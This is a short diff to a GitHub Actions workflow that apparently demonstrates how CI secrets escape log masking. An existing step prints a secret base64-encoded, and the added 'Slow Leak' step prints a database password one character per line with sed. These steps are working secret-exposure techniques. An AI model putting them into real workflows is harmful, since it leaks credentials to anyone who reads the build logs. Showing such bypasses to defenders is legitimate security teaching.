@@ -19,3 +19,9 @@ jobs:
           # GitHub DOES NOT recognize the Base64 version of your secret.
           # It will print the raw Base64 string to the logs!
           echo $MY_SECRET | base64
+      - name: The "Slow Leak" (Bypassing Maskers)
+        env:
+          MY_SECRET: ${{ secrets.DATABASE_PASSWORD }}
+        run: |
+          # Loop through the secret and print each char on a new line
+          echo "$MY_SECRET" | sed 's/./&\n/g'
